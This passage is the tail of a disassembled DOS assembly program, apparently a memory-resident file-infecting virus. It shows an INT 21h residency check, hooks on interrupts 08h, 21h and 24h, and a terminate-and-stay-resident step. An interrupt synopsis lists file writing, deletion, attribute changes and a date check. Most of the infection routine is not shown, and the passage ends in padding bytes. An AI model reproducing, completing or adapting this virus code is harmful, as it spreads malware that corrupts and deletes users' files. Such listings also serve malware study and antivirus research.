		mov	cs:data_42e,es		; (77C7:0031=77C7h)
		mov	cs:data_44e,es		; (77C7:0039=77C7h)
		mov	cs:data_45e,es		; (77C7:003D=77C7h)
		mov	cs:data_46e,es		; (77C7:0041=77C7h)
		mov	ax,es
		add	ax,10h
		add	word ptr cs:data_49e+2,ax	; (77C7:0049=0)
		add	cs:data_48e,ax		; (77C7:0045=0)
		mov	ah,0E0h
		int	21h			; DOS Services  ah=function E0h
		cmp	ah,0E0h
		jae	loc_47			; Jump if above or =
		cmp	ah,3
		pop	es
		mov	ss,cs:data_48e		; (77C7:0045=0)
		mov	sp,cs:data_72e		; (77C7:E943=0FFFFh)
		db	0F3h, 03h, 90h, 90h, 90h
loc_47:						;  xref 77C7:0801
		db	1008 dup (90h)
		db	0B4h, 4Ch,0A0h,0FEh, 04h,0CDh
		db	 21h, 00h, 00h, 00h
		db	 20h, 20h, 20h, 20h, 20h

seg_a		ends



		end	start

±±±±±±±±±±±±±±±±±±±± CROSS REFERENCE - KEY ENTRY POINTS ±±±±±±±±±±±±±±±±±±±

    seg:off    type	   label
   ---- ----   ----   ---------------
   77C7:0100   far    start
   77C7:021B   far    int_24h_entry
   77C7:021E   far    int_08h_entry
   77C7:025B   far    int_21h_entry

 ±±±±±±±±±±±±±±±±±± Interrupt Usage Synopsis ±±±±±±±±±±±±±±±±±±

        Interrupt 21h :	 set intrpt vector al to ds:dx
        Interrupt 21h :	 get date, cx=year, dx=mon/day
        Interrupt 21h :	 terminate & stay resident
        Interrupt 21h :	 get intrpt vector al in es:bx
        Interrupt 21h :	 get free space, drive dl,1=a:
        Interrupt 21h :	 open file, al=mode,name@ds:dx
        Interrupt 21h :	 close file, bx=file handle
        Interrupt 21h :	 read file, cx=bytes, to ds:dx
        Interrupt 21h :	 write file cx=bytes, to ds:dx
        Interrupt 21h :	 delete file, name @ ds:dx
        Interrupt 21h :	 move file ptr, cx,dx=offset
        Interrupt 21h :	 get/set file attrb, nam@ds:dx
        Interrupt 21h :	 allocate memory, bx=bytes/16
        Interrupt 21h :	 release memory block, es=seg
        Interrupt 21h :	 change mem allocation, bx=siz
        Interrupt 21h :	 get return code info in ax
        Interrupt 21h :	 get/set file date & time

 ±±±±±±±±±±±±±±±±±± I/O	Port Usage Synopsis  ±±±±±±±±±±±±±±±±±±

        No I/O ports used.


